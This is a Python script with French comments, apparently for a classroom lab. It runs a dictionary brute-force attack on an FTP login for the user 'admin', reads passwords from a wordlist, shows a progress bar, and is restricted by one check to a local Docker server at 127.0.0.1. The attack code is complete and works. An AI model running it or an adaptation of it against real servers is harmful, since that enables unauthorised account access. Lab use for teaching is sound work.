import time
from ftplib import FTP, error_perm

# -------------------------
# CONFIGURATION
# -------------------------

USERNAME = "admin"               # Utilisateur FTP
WORDLIST_PATH = "wordlist.txt"   # Fichier contenant une liste de mots de passe

FTP_HOST = "127.0.0.1"           # On force le FTP à rester local !
FTP_PORT = 21

# Largeur de la barre de progression (en nombre de caractères)
PROGRESS_BAR_WIDTH = 30
PROGRESS_STEP = 50  # Affichage toutes les 50 tentatives


def charger_mots_de_passe(chemin_fichier):
    """
    Lit un fichier texte et renvoie une liste de mots de passe (une ligne = un mot de passe).
    """
    mots = []

    with open(chemin_fichier, "r", encoding="utf-8") as f:
        for ligne in f:
            mot = ligne.strip()
            if mot != "":
                mots.append(mot)

    return mots


def tester_login_ftp_reel(password_a_tester: str) -> bool:
    """
    Teste une connexion FTP réelle sur le serveur Docker local.
    """
    if FTP_HOST not in ("127.0.0.1", "localhost"):
        raise ValueError("Par sécurité, ce script ne doit cibler que 127.0.0.1 / localhost.")

    try:
        with FTP() as ftp:
            ftp.connect(host=FTP_HOST, port=FTP_PORT, timeout=3)
            ftp.login(user=USERNAME, passwd=password_a_tester)
            return True

    except error_perm:
        return False

    except OSError:
        return False


def afficher_progression(tentative: int, total: int, start_time: float):
    """
    Affiche une barre de progression avec :
    - pourcentage
    - nb de tentatives
    - temps écoulé
    """
    if total == 0:
        return

    progress = tentative / total
    filled_length = int(PROGRESS_BAR_WIDTH * progress)
    bar = "#" * filled_length + "-" * (PROGRESS_BAR_WIDTH - filled_length)
    temps_ecoule = time.time() - start_time

    print(
        f"[PROGRESSION] [{bar}] {progress * 100:5.1f}% "
        f"- {tentative}/{total} tentatives "
        f"- Temps écoulé : {temps_ecoule:.2f} sec"
    )


def bruteforce():
    """
    Effectue un bruteforce par dictionnaire sur le serveur FTP Docker local :
    - lit tous les mots de passe de la wordlist
    - les teste un par un (connexion FTP réelle)
    - s'arrête dès que le bon mot de passe est trouvé
    """
    print("=== Outil de bruteforce pédagogique (FTP Docker local) ===")
    print(f"Utilisateur ciblé : {USERNAME}")
    print(f"Serveur FTP       : {FTP_HOST}:{FTP_PORT}")
    print(f"Wordlist utilisée : {WORDLIST_PATH}")
    print("----------------------------------------------")

    mots_de_passe = charger_mots_de_passe(WORDLIST_PATH)
    total = len(mots_de_passe)
    print(f"Nombre de mots de passe dans la wordlist : {total}")
    print()

    tentative = 0
    start = time.time()

    for mot in mots_de_passe:
        tentative += 1

        # Affichage de la progression toutes les PROGRESS_STEP tentatives
        if tentative % PROGRESS_STEP == 0:
            afficher_progression(tentative, total, start)

        # Test FTP réel
        if tester_login_ftp_reel(mot):
            end = time.time()
            duree = end - start

            afficher_progression(tentative, total, start)

            print()
            print("✅ Mot de passe trouvé !")
            print(f"   Utilisateur : {USERNAME}")
            print(f"   Mot de passe : {mot}")
            print(f"   Tentatives   : {tentative}")
            print(f"   Temps écoulé : {duree:.4f} secondes")
            return

    end = time.time()
    duree = end - start

    afficher_progression(tentative, total, start)

    print()
    print("❌ Aucun mot de passe de la wordlist ne correspond.")
    print(f"   Tentatives   : {tentative}")
    print(f"   Temps écoulé : {duree:.4f} secondes")


if __name__ == "__main__":
    bruteforce()
